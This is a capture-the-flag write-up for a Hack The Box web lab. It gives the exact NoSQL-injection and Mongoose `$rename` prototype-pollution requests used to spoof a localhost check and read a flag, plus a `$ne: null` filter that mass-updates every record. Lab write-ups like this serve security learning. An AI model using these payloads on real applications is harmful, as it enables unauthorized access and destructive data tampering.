# Secure Notes — SOLVED (assisted: writeup found for mechanism; payloads self-built)

- Platform: HTB web (ACTIVE at time of solve)
- Date: 2026-09-10
- Flag: `HTB{REDACTED}` (HTTP 200 from /flag)
- Artifacts: `~/ctf/challenges/secnotes/` (this file), probing notes: 6aa2b08a/b0a7/b2f5
- Reference: shenyuchao Medium writeup (mechanism) + hackwithhusnain (steps)

## The app

Express + Mongoose (MongoDB). Endpoints: `POST /create {title,content}`,
`GET /get/:id`, `POST /update {_id-filter via "noteId", title, content}`,
`GET /flag` (403 "Access denied" — gates on `req.socket._peername.address`).

## The chain (4 steps)

1. `POST /create {title:"127.0.0.1", content:"IPv4"}` — these VALUES become the
   polluted prototype fields.
2. **NoSQL injection + `$rename` prototype pollution**: the /update body keys go
   (nearly raw) into the update — send BOTH noteId AND `$rename`:
   ```json
   {"noteId": {"_id": "<my note id>"},
    "$rename": {"title": "__proto__._peername.address",
                "content": "__proto__._peername.family"}}
   ```
   Mongo `$rename` writes `_peername` **into `__proto__` of the document**.
   (Mongo's `$set`-style validations don't clean `$rename` targets; strict mode
   would only block schema-unknown $set paths, per the writeups.)
3. **"Load the document to apply the pollution"**: `GET /get/<id>` — the materialization
   of the loaded doc (`Object.assign`-like clone) hits the `__proto__` SETTER →
   **`Object.prototype._peername = {address:"127.0.0.1", family:"IPv4"}`** — global fallout.
4. `GET /flag` → 200 → flag. The /flag gate reads `req.socket._peername.address`,
   which now falls through to the polluted `Object.prototype` = "127.0.0.1".

## Reusable lessons

- **Mongoose `$rename` with dotted `__proto__` paths = the modern prototype
  pollution vector** when the update object is attacker-shaped and `strict` blocks
  direct `__proto__` `$set`.
- Once `Object.prototype.X` is poisoned, EVERYTHING inherits it: `undefined`.
  Fallback-type checks (`req.socket._peername?.address`) flip to attacker values.
- `/update` was doubly injectable: (a) the noteId FILTER objects pass through to
  mongoose — **`{"$ne": null}` blasts EVERY note in the collection with your
  update**; with the omission of title/content it becomes a non-destructive
  read-oracle returning all matched docs unchanged (the read-oracle saved my window-envelope);
  (b) extra body keys reach the update operators.
- THE COSTLY MISTAKE (instance lost): the first `$ne: null` probe fired BEFORE I
  knew the update semantics — it mass-updated the collection. ALWAYS test
  update-semantics on YOUR OWN note with omitted fields before any broad filter.
- `GET /flag` = GET-only (OPTIONS gives 404). API surface = /create /get/:id
  /update /flag; everything else 404.
